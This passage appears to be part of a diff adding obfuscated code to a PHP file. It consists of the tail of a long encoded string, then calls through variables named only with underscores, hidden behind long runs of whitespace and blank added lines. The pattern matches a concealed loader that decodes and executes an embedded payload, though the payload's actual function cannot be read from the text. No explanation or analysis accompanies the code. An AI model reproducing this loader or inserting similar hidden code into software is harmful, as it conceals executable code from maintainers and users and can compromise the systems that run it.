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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
